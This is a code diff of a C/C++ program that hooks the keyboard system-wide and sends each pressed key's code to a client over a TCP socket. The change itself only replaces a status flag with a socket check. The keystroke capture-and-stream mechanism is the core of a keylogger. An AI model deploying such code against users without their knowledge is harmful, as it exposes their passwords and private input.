@@ -24,7 +24,6 @@
 
 // HHOOK variable
 HHOOK hHook{ NULL };
-BOOL server_active = false;
 SOCKET ClientSocket = INVALID_SOCKET;
 
 /*
@@ -51,6 +50,7 @@ LRESULT CALLBACK CatchLowLevelKeyboardProc(const int nCode, const WPARAM wParam,
 			buf[0] = (keyInfo.vkCode >> 0);
 			int iSendResult = send(ClientSocket, (char*)buf, sizeof(buf), 0);
 			printf("Byte sent = %#.2X \r\n", buf[0]);
+			// Write in the file
 		}
 		break;
 	}
@@ -146,7 +146,6 @@ int main(int argc, char* argv[])
 	{
 		printf("Usage: %s <PORT>\n", argv[0]);
 		printf("KEYDOWN events will not be streamed\n");
-		server_active = false;
 	}
 	else
 	{
@@ -157,9 +156,7 @@ int main(int argc, char* argv[])
 		{
 			printf("Error at creating listener at port: %s\n", port);
 			printf("KEYDOWN events will not be streamed\n");
-			server_active = false;
 		}
-		server_active = true;
 	}
 	Sleep(2000);
 
@@ -176,7 +173,7 @@ int main(int argc, char* argv[])
 	}
 
 	// Wait for Client
-	if (server_active)
+	if (ListenSocket != INVALID_SOCKET)
 	{
 		printf("Waiting for a Client ... \r\n");
 		ClientSocket = ConnectClientSocket(ListenSocket);
